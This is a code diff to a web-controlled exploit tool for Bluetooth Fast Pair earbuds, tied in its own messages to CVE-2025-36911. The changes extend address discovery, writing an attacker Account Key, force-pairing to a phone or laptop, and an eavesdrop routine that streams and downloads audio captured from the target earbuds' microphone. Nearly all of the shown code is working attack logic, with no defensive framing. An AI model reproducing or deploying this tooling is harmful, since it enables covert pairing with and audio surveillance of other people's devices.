@@ -30,7 +30,11 @@ from fast_pair_demo import (
     calculate_entropy,
     pair_classic_bluetooth,
     connect_classic_bluetooth,
+    discover_bredr_address,
+    parse_system_id,
+    resolve_identity_address,
     aes_encrypt,
+    CHAR_SYSTEM_ID,
     CHAR_KEY_PAIRING,
     CHAR_PASSKEY,
     CHAR_ACCOUNT_KEY,
@@ -40,7 +44,7 @@ from fast_pair_demo import (
 
 import secrets
 
-from adb_manager import ADBManager
+from adb_manager import ADBManager, _adb_env
 from known_devices import lookup_device, KNOWN_DEVICES
 
 adb = ADBManager()
@@ -115,6 +119,7 @@ def api_strategies():
 @app.route("/api/known-devices")
 def api_known_devices():
     return jsonify(KNOWN_DEVICES)
+
 
 
 # ==============================================================================
@@ -195,13 +200,10 @@ def handle_track_laptop(data):
     scripting bluetoothctl. Requires sudo for /var/lib/bluetooth access and
     bluetoothd restart.
     """
-    bredr_address = data.get("bredr_address")
+    bredr_address = data.get("bredr_address")  # May be None — resolved during BLE pairing
     ble_address = data.get("ble_address")
     device_name = data.get("device_name", "Unknown")
 
-    if not bredr_address:
-        emit("track:status", {"stage": "error", "message": "No BR/EDR address provided", "status": "error"})
-        return
     if not ble_address:
         emit("track:status", {"stage": "error", "message": "No BLE address provided — run exploit first", "status": "error"})
         return
@@ -361,10 +363,53 @@ async def _laptop_pair_async(ble_address, bredr_address, device_name):
                            stage="complete", status="warning")
                     return
 
-        status("BLE paired. Step 3/4: Deriving BR/EDR Link Key via CTKD...")
+        status("BLE paired. Resolving identity address...")
 
-        # Give BlueZ a moment to flush the LTK to disk
-        await asyncio.sleep(1)
+        # Give BlueZ a moment to flush the LTK and resolve the identity address
+        await asyncio.sleep(2)
+
+        # If we don't have a BR/EDR address yet, read it from BlueZ.
+        # After SMP, BlueZ resolves the identity address for dual-mode devices.
+        if not bredr_address:
+            objects = await manager.call_get_managed_objects()
+            for path, ifaces in objects.items():
+                if DEVICE_IFACE not in ifaces:
+                    continue
+                dev_props_map = ifaces[DEVICE_IFACE]
+                addr_v = dev_props_map.get("Address")
+                addr_val = addr_v.value if hasattr(addr_v, "value") else addr_v
+                type_v = dev_props_map.get("AddressType")
+                type_val = type_v.value if hasattr(type_v, "value") else type_v
+                paired_v = dev_props_map.get("Paired")
+                paired_val = paired_v.value if hasattr(paired_v, "value") else paired_v
+
+                if (type_val == "public" and paired_val
+                        and addr_val and addr_val.upper() != ble_address.upper()):
+                    bredr_address = addr_val.upper()
+                    status(f"Identity address resolved: {bredr_address}")
+                    break
+
+            # Also check the original device path — BlueZ may update in-place
+            if not bredr_address:
+                try:
+                    dev_intro2 = await bus.introspect(BLUEZ_SERVICE, dev_path)
+                    dev_obj2 = bus.get_proxy_object(BLUEZ_SERVICE, dev_path, dev_intro2)
+                    props2 = dev_obj2.get_interface(PROPERTIES_IFACE)
+                    at_var = await props2.call_get(DEVICE_IFACE, "AddressType")
+                    ad_var = await props2.call_get(DEVICE_IFACE, "Address")
+                    if at_var.value == "public" and ad_var.value.upper() != ble_address.upper():
+                        bredr_address = ad_var.value.upper()
+                        status(f"Identity address resolved (in-place): {bredr_address}")
+                except Exception:
+                    pass
+
+        if not bredr_address:
+            status("Could not resolve BR/EDR identity address from BLE pairing. "
+                   "The device may be LE-only, or try the phone flow instead.",
+                   stage="complete", status="warning")
+            return
+
+        status(f"Step 3/4: Deriving BR/EDR Link Key via CTKD (BR/EDR: {bredr_address})...")
 
         # CTKD — derive BR/EDR link key from LE LTK
         success, msg, link_key_hex = perform_ctkd(
@@ -494,6 +539,100 @@ async def _laptop_pair_async(ble_address, bredr_address, device_name):
         bus.disconnect()
 
 
+def _resolve_bredr_via_phone(device_id: str, ble_address: str,
+                             timeout: int = 45) -> str | None:
+    """Launch the companion app on the phone to do KBP + bond, then read
+    the resolved BR/EDR address from its logcat output.
+
+    This is used as a fallback when the laptop can't determine the BR/EDR
+    address. The phone's BT stack resolves the identity address during
+    SMP bonding and the companion app reports it back.
+
+    Returns the resolved BR/EDR address, or None.
+    """
+    import re
+    adb_e = _adb_env()
+
+    # Snapshot bonded devices so we can detect new bonds
+    bonded_before = adb.get_bonded_addresses(device_id)
+
+    # Clear logcat and kill any existing instance of the companion app
+    subprocess.run(["adb", "-s", device_id, "logcat", "-c"],
+                   capture_output=True, text=True, timeout=5, env=adb_e)
+    subprocess.run(["adb", "-s", device_id, "shell", "am", "force-stop",
+                    "com.whisperpair.companion"],
+                   capture_output=True, text=True, timeout=5, env=adb_e)
+
+    # Launch companion app
+    cmd = ["adb", "-s", device_id, "shell", "am", "start",
+           "-a", "com.whisperpair.PAIR",
+           "--es", "address", ble_address]
+    launch = subprocess.run(cmd, capture_output=True, text=True, timeout=10, env=adb_e)
+    if launch.returncode != 0:
+        return None
+
+    socketio.emit("exploit:stage", {
+        "stage": "address",
+        "message": "Phone companion app running KBP + bonding...",
+        "status": "running",
+        "timestamp": datetime.now().isoformat(),
+    })
+
+    # Monitor logcat for the resolved address
+    logcat_proc = subprocess.Popen(
+        ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
+        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+        env=adb_e,
+    )
+
+    resolved_addr = None
+    start = time.time()
+    try:
+        while time.time() - start < timeout:
+            ready, _, _ = select.select([logcat_proc.stdout], [], [], 2.0)
+            if not ready:
+                continue
+            line = logcat_proc.stdout.readline().strip()
+            if not line:
+                continue
+            msg = line.split(":", 1)[-1].strip() if ":" in line else line
+
+            # Look for the resolved address
+            if "RESOLVED_BREDR_ADDRESS=" in msg:
+                addr_part = msg.split("RESOLVED_BREDR_ADDRESS=", 1)[1].strip()
+                if addr_part and addr_part != "UNKNOWN" and ":" in addr_part:
+                    resolved_addr = addr_part
+                    break
+
+            # Also check "Resolved BR/EDR address:" log line
+            match = re.search(r'Resolved BR/EDR address:\s*([0-9A-Fa-f:]{17})', msg)
+            if match:
+                resolved_addr = match.group(1).upper()
+                break
+
+            # Stop waiting if the app finished
+            if "EXPLOIT COMPLETE" in msg or "PARTIAL SUCCESS" in msg:
+                break
+
+    finally:
+        logcat_proc.terminate()
+        try:
+            logcat_proc.wait(timeout=5)
+        except Exception:
+            logcat_proc.kill()
+
+    # If logcat didn't give us an address, check bonded devices directly
+    if not resolved_addr:
+        bonded_after = adb.get_bonded_addresses(device_id)
+        new_bonds = bonded_after - bonded_before
+        for addr in new_bonds:
+            if addr.upper() != ble_address.upper():
+                resolved_addr = addr.upper()
+                break
+
+    return resolved_addr
+
+
 def handle_track_phone(data):
     """Launch the companion app on the Android phone to perform Fast Pair KBP."""
     device_id = data.get("device_id") or selected_adb_device
@@ -539,13 +678,18 @@ def handle_track_phone(data):
             "status": "running",
         })
 
+        # Force-stop the app first in case EavesdropActivity or a stale instance is running
+        subprocess.run(["adb", "-s", device_id, "shell", "am", "force-stop",
+                        "com.whisperpair.companion"],
+                       capture_output=True, text=True, timeout=5, env=_adb_env())
+
         cmd = ["adb", "-s", device_id, "shell", "am", "start",
                "-a", "com.whisperpair.PAIR",
                "--es", "address", ble_address]
         if bredr_address:
             cmd.extend(["--es", "bredr_address", bredr_address])
 
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, env=_adb_env())
 
         if result.returncode != 0:
             socketio.emit("track:status", {
@@ -566,11 +710,13 @@ def handle_track_phone(data):
         logcat_proc = subprocess.Popen(
             ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+            env=_adb_env(),
         )
 
         kbp_accepted = False
         account_key_written = False
         classic_paired = False
+        resolved_bredr = None
         start_time = time.time()
         timeout = 60  # 60 seconds max
 
@@ -600,6 +746,16 @@ def handle_track_phone(data):
                             "message": msg,
                             "status": "success",
                         })
+                    elif "RESOLVED_BREDR_ADDRESS=" in msg:
+                        # Companion app resolved the BR/EDR address from bonded devices
+                        addr_part = msg.split("RESOLVED_BREDR_ADDRESS=", 1)[1].strip()
+                        if addr_part and addr_part != "UNKNOWN" and ":" in addr_part:
+                            resolved_bredr = addr_part
+                            socketio.emit("track:status", {
+                                "stage": "address_resolved",
+                                "message": f"BR/EDR address resolved from phone: {resolved_bredr}",
+                                "status": "success",
+                            })
                     elif "Device bonded" in msg or "BOND_BONDED" in msg or "Classic BT paired" in msg:
                         classic_paired = True
                         socketio.emit("track:status", {
@@ -627,6 +783,9 @@ def handle_track_phone(data):
             logcat_proc.terminate()
             logcat_proc.wait(timeout=5)
 
+        # Use the resolved BR/EDR address if we got one from the companion app
+        effective_bredr = resolved_bredr or bredr_address or ble_address
+
         # Report final status
         if classic_paired:
             socketio.emit("track:status", {
@@ -634,7 +793,7 @@ def handle_track_phone(data):
                 "message": "Device force-paired with phone via CVE-2025-36911! "
                            "Phone now has full audio access to the target earbuds.",
                 "status": "success",
-                "bredr_address": bredr_address or ble_address,
+                "bredr_address": effective_bredr,
             })
         elif kbp_accepted:
             socketio.emit("track:status", {
@@ -840,7 +999,7 @@ async def _run_exploit_chain(address: str, strategies: list):
 
         if "1234" in char_uuid:
             kbp_response = data
-            addr = parse_kbp_response(data, shared_secret)
+            addr = parse_kbp_response(data, shared_secret, ble_address=address)
             if addr:
                 br_edr_address = addr
                 stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")
@@ -915,6 +1074,18 @@ async def _run_exploit_chain(address: str, strategies: list):
         except Exception as e:
             stage("model_id", f"Could not read Model ID: {e}", "warning")
 
+        # Step 2.5: Try reading System ID for BR/EDR address (free, no pairing needed)
+        system_id_address = None
+        try:
+            sid_data = await client.read_gatt_char(CHAR_SYSTEM_ID)
+            system_id_address = parse_system_id(sid_data)
+            if system_id_address:
+                stage("system_id", f"BR/EDR address from System ID: {system_id_address}", "success")
+            else:
+                stage("system_id", f"System ID present but not BD_ADDR-derived: {sid_data.hex()}", "warning")
+        except Exception:
+            pass  # System ID characteristic not available — that's fine
+
         # Step 3: Subscribe to notifications
         if exploit_cancel.is_set():
             return
@@ -984,44 +1155,81 @@ async def _run_exploit_chain(address: str, strategies: list):
             socketio.emit("exploit:result", result)
             return
 
-        # Step 5: Determine BR/EDR address
-        if not br_edr_address:
-            br_edr_address = address
-            stage("address", f"Using BLE address as BR/EDR fallback: {address}", "warning")
-        else:
-            stage("address", f"BR/EDR address: {br_edr_address}", "success")
-
-        result["br_edr_address"] = br_edr_address
-
-        # Step 6: Write Account Key
+        # Step 5: Write Account Key WHILE STILL CONNECTED
+        # (must happen before BR/EDR discovery which disconnects BLE)
         if exploit_cancel.is_set():
             return
         stage("account_key", "Writing Account Key...")
 
-        account_key = bytearray(16)
-        account_key[0] = 0x04
-        account_key[1:16] = secrets.token_bytes(15)
-        result["account_key"] = account_key.hex()
+        if client and client.is_connected:
+            account_key = bytearray(16)
+            account_key[0] = 0x04
+            account_key[1:16] = secrets.token_bytes(15)
+            result["account_key"] = account_key.hex()
 
-        if shared_secret:
-            data_to_write = aes_encrypt(shared_secret, bytes(account_key))
+            if shared_secret:
+                data_to_write = aes_encrypt(shared_secret, bytes(account_key))
+            else:
+                data_to_write = bytes(account_key)
+
+            try:
+                await client.write_gatt_char(CHAR_ACCOUNT_KEY, data_to_write, response=True)
+                result["account_key_written"] = True
+                stage("account_key", f"Account Key written successfully: {account_key.hex()}", "success")
+            except Exception as e:
+                stage("account_key", f"Account Key write failed: {e}", "warning")
+
+            # Step 6: Disconnect BLE (done with GATT operations)
+            await client.disconnect()
+            client = None
+            stage("disconnect", "BLE disconnected", "success")
+
+        # Step 7: Determine BR/EDR address (after BLE is disconnected)
+        if not br_edr_address:
+            stage("address", "KBP response did not contain BR/EDR address, trying fallbacks...", "warning")
+
+            # Fallback A: Use System ID if we got one earlier
+            if system_id_address:
+                br_edr_address = system_id_address
+                stage("address", f"BR/EDR address from GATT System ID: {br_edr_address}", "success")
+
+            # Fallback B: Classic BT inquiry scan
+            if not br_edr_address:
+                stage("address", "Running Classic BT inquiry scan...", "running")
+                device_name = None
+                for dev in discovered_devices:
+                    if dev.get("address", "").upper() == address.upper():
+                        device_name = dev.get("name")
+                        break
+
+                if device_name and device_name != "Unknown":
+                    def inquiry_status(msg):
+                        stage("address", msg, "running")
+
+                    inquiry_addr = await asyncio.get_event_loop().run_in_executor(
+                        None,
+                        lambda: discover_bredr_address(
+                            device_name=device_name,
+                            ble_address=address,
+                            status_cb=inquiry_status,
+                        )
+                    )
+                    if inquiry_addr:
+                        br_edr_address = inquiry_addr
+                        stage("address", f"BR/EDR address via inquiry: {br_edr_address}", "success")
+
+            # Fallback C: manual override (last resort)
+            if not br_edr_address:
+                br_edr_address = address
+                result["br_edr_address_needs_override"] = True
+                stage("address",
+                      f"Could not determine BR/EDR address. BLE address {address} pre-filled — "
+                      f"replace it with the correct Classic BT address.",
+                      "warning")
         else:
-            data_to_write = bytes(account_key)
+            stage("address", f"BR/EDR address: {br_edr_address}", "success")
 
-        try:
-            await client.write_gatt_char(CHAR_ACCOUNT_KEY, data_to_write, response=True)
-            result["account_key_written"] = True
-            stage("account_key", f"Account Key written successfully: {account_key.hex()}", "success")
-        except Exception as e:
-            stage("account_key", f"Account Key write failed: {e}", "warning")
-
-        # Step 7: Disconnect BLE
-        await client.disconnect()
-        client = None
-        stage("disconnect", "BLE disconnected", "success")
-
-        # Skip Classic BT pairing from laptop — the companion app on
-        # the phone will handle pairing via the Track button.
+        result["br_edr_address"] = br_edr_address
         result["paired"] = False
 
         # Final result
@@ -1092,7 +1300,7 @@ async def _run_vuln_test(address: str, strategies: list):
         socketio.emit("exploit:notification", entry)
 
         if "1234" in char_uuid:
-            addr = parse_kbp_response(data, shared_secret)
+            addr = parse_kbp_response(data, shared_secret, ble_address=address)
             if addr:
                 br_edr_address = addr
                 stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")
@@ -1223,6 +1431,8 @@ async def _run_vuln_test(address: str, strategies: list):
 last_eavesdrop_file = None
 eavesdrop_logcat = None
 eavesdrop_proc = None  # For laptop mode parecord process
+eavesdrop_audio_sock = None  # TCP socket to Android audio stream
+eavesdrop_device_id = None  # ADB device used for the active eavesdrop session
 
 
 @app.route("/api/eavesdrop/download")
@@ -1398,9 +1608,10 @@ def handle_eavesdrop_laptop(data):
 
 
 def handle_eavesdrop_phone(data):
-    global last_eavesdrop_file, eavesdrop_logcat
+    global last_eavesdrop_file, eavesdrop_logcat, eavesdrop_device_id
 
     device_id = data.get("device_id") or selected_adb_device
+    eavesdrop_device_id = device_id
     address = data.get("address")
 
     if not device_id:
@@ -1413,8 +1624,9 @@ def handle_eavesdrop_phone(data):
     def run_live_eavesdrop():
         global last_eavesdrop_file, eavesdrop_logcat
 
+        adb_e = _adb_env()
         subprocess.run(["adb", "-s", device_id, "logcat", "-c"],
-                       capture_output=True, text=True, timeout=5)
+                       capture_output=True, text=True, timeout=5, env=adb_e)
 
         socketio.emit("eavesdrop:status", {
             "stage": "launching",
@@ -1427,7 +1639,7 @@ def handle_eavesdrop_phone(data):
             ["adb", "-s", device_id, "shell", "am", "start",
              "-a", "com.whisperpair.EAVESDROP",
              "--es", "address", address],
-            capture_output=True, text=True, timeout=10,
+            capture_output=True, text=True, timeout=10, env=adb_e,
         )
         if result.returncode != 0:
             socketio.emit("eavesdrop:status", {
@@ -1440,7 +1652,7 @@ def handle_eavesdrop_phone(data):
         # Set up ADB port forwarding for audio stream
         subprocess.run(
             ["adb", "-s", device_id, "forward", "tcp:19876", "tcp:19876"],
-            capture_output=True, text=True, timeout=5,
+            capture_output=True, text=True, timeout=5, env=adb_e,
         )
 
         # Start logcat monitor
@@ -1448,6 +1660,7 @@ def handle_eavesdrop_phone(data):
         logcat_proc = subprocess.Popen(
             ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+            env=adb_e,
         )
         eavesdrop_logcat = logcat_proc
 
@@ -1502,6 +1715,7 @@ def handle_eavesdrop_phone(data):
 def stream_audio_to_browser():
     """Connect to the Android app's TCP audio stream and forward
     raw PCM chunks to the browser via Socket.IO."""
+    global eavesdrop_audio_sock
     time.sleep(3)  # Wait for the app to start the server
 
     try:
@@ -1509,6 +1723,7 @@ def stream_audio_to_browser():
         s.settimeout(5)
         s.connect(("127.0.0.1", 19876))
         s.settimeout(1)
+        eavesdrop_audio_sock = s
     except Exception as e:
         socketio.emit("eavesdrop:status", {
             "stage": "recording",
@@ -1524,7 +1739,7 @@ def stream_audio_to_browser():
     })
 
     try:
-        while True:
+        while not eavesdrop_stopping.is_set():
             try:
                 data = s.recv(4096)
                 if not data:
@@ -1541,6 +1756,7 @@ def stream_audio_to_browser():
             except Exception:
                 break
     finally:
+        eavesdrop_audio_sock = None
         s.close()
 
 
@@ -1549,16 +1765,29 @@ eavesdrop_stopping = threading.Event()
 
 @socketio.on("eavesdrop:stop")
 def handle_eavesdrop_stop():
-    global eavesdrop_logcat, eavesdrop_proc
-    device_id = selected_adb_device
+    global eavesdrop_logcat, eavesdrop_proc, eavesdrop_audio_sock, eavesdrop_device_id
+    device_id = eavesdrop_device_id or selected_adb_device
 
-    # Signal the logcat thread to stop
+    # Signal all eavesdrop threads to stop
     eavesdrop_stopping.set()
+
+    # Close the audio stream socket to unblock recv() immediately
+    if eavesdrop_audio_sock:
+        try:
+            eavesdrop_audio_sock.close()
+        except Exception:
+            pass
+        eavesdrop_audio_sock = None
 
     # Stop laptop mode recording if active
     if eavesdrop_proc and eavesdrop_proc.poll() is None:
         eavesdrop_proc.terminate()
         eavesdrop_proc = None
+
+    # Kill logcat monitor
+    if eavesdrop_logcat and eavesdrop_logcat.poll() is None:
+        eavesdrop_logcat.terminate()
+        eavesdrop_logcat = None
 
     socketio.emit("eavesdrop:status", {
         "stage": "stopping",
@@ -1566,57 +1795,66 @@ def handle_eavesdrop_stop():
         "status": "running",
     })
 
-    if device_id:
-        # Send stop broadcast to the app
-        subprocess.run(
-            ["adb", "-s", device_id, "shell", "am", "broadcast",
-             "-a", "com.whisperpair.STOP_EAVESDROP"],
-            capture_output=True, text=True, timeout=5,
-        )
-
-        # Kill logcat monitor
-        if eavesdrop_logcat and eavesdrop_logcat.poll() is None:
-            eavesdrop_logcat.terminate()
-            eavesdrop_logcat = None
-
-        # Remove port forward
-        subprocess.run(
-            ["adb", "-s", device_id, "forward", "--remove", "tcp:19876"],
-            capture_output=True, text=True, timeout=5,
-        )
-
-    # Pull recording in background
-    def pull_recording():
+    # Run the full stop + pull sequence in a background thread
+    # so the socket event returns immediately
+    def stop_and_pull():
         global last_eavesdrop_file
-        time.sleep(2)
+        adb_e = _adb_env()
 
-        if not device_id:
-            return
+        if device_id:
+            # 1. Send stop broadcast (gives the app a chance to flush the WAV)
+            subprocess.run(
+                ["adb", "-s", device_id, "shell", "am", "broadcast",
+                 "-a", "com.whisperpair.STOP_EAVESDROP"],
+                capture_output=True, text=True, timeout=5, env=adb_e,
+            )
+            time.sleep(2)
 
-        recording_file = "/storage/emulated/0/Android/data/com.whisperpair.companion/files/eavesdrop_live.wav"
-        local_path = os.path.join(os.path.dirname(__file__), "eavesdrop_recording.wav")
-        pull_result = subprocess.run(
-            ["adb", "-s", device_id, "pull", recording_file, local_path],
-            capture_output=True, text=True, timeout=15,
-        )
+            # 2. Pull recording BEFORE force-stopping (file is still on disk)
+            recording_file = "/storage/emulated/0/Android/data/com.whisperpair.companion/files/eavesdrop_live.wav"
+            local_path = os.path.join(os.path.dirname(__file__), "eavesdrop_recording.wav")
+            pull_result = subprocess.run(
+                ["adb", "-s", device_id, "pull", recording_file, local_path],
+                capture_output=True, text=True, timeout=15, env=adb_e,
+            )
 
-        if pull_result.returncode == 0 and os.path.exists(local_path):
-            size = os.path.getsize(local_path)
-            last_eavesdrop_file = local_path
-            socketio.emit("eavesdrop:status", {
-                "stage": "complete",
-                "message": f"Recording saved — {size // 1024}KB captured from earbuds mic.",
-                "status": "success",
-                "download_url": "/api/eavesdrop/download",
-            })
+            # 3. Force-stop the app (guaranteed kill)
+            subprocess.run(
+                ["adb", "-s", device_id, "shell", "am", "force-stop",
+                 "com.whisperpair.companion"],
+                capture_output=True, text=True, timeout=5, env=adb_e,
+            )
+
+            # 4. Clean up ADB port forward
+            subprocess.run(
+                ["adb", "-s", device_id, "forward", "--remove", "tcp:19876"],
+                capture_output=True, text=True, timeout=5, env=adb_e,
+            )
+
+            if pull_result.returncode == 0 and os.path.exists(local_path):
+                size = os.path.getsize(local_path)
+                last_eavesdrop_file = local_path
+                socketio.emit("eavesdrop:status", {
+                    "stage": "complete",
+                    "message": f"Recording saved — {size // 1024}KB captured from earbuds mic.",
+                    "status": "success",
+                    "download_url": "/api/eavesdrop/download",
+                })
+            else:
+                socketio.emit("eavesdrop:status", {
+                    "stage": "complete",
+                    "message": "Eavesdrop stopped. Recording could not be retrieved.",
+                    "status": "warning",
+                })
         else:
             socketio.emit("eavesdrop:status", {
                 "stage": "complete",
-                "message": "Eavesdrop stopped.",
+                "message": "Eavesdrop stopped (no ADB device for recording pull).",
                 "status": "warning",
             })
 
-    threading.Thread(target=pull_recording, daemon=True).start()
+    threading.Thread(target=stop_and_pull, daemon=True).start()
+    eavesdrop_device_id = None
 
 
 if __name__ == "__main__":
